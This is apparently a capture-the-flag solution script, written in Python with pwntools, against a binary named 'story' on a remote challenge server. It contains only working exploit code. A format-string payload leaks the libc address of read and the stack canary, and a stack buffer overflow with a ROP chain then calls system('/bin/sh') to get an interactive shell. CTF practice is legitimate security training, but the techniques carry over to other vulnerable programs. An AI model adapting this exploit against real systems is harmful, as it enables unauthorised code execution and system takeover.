from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./story")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./story")
else:
	p = remote("ctf3.linkedbyx.com",11225)
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./story")

def debugf():
	gdb.attach(p,"b printf")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
offset = 8
payload = "%12$saaa%15$p"
payload = payload.ljust(0x32-8-8-2,"\x00")
payload += p64(elf.got["read"])
p.sendlineafter("Your ID:",payload)
p.recvuntil("Hello ")
read_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = read_addr - libc.symbols["read"]
log.success("libc_base:" + hex(libc.address))
p.recvuntil("aaa")
canary = int(p.recvuntil("\x0a",drop = True),16)
log.success("canary:" + hex(canary))
p.sendlineafter("story:","129")
pop_rdi_ret = 0x0000000000400bd3
binsh = libc.search("/bin/sh").next()
system = libc.symbols["system"]
payload = "a" * (0x90 - 8) + p64(canary) + "junkjunk" + p64(pop_rdi_ret) + p64(binsh) + p64(system)
p.sendlineafter("story:",payload)
p.interactive()
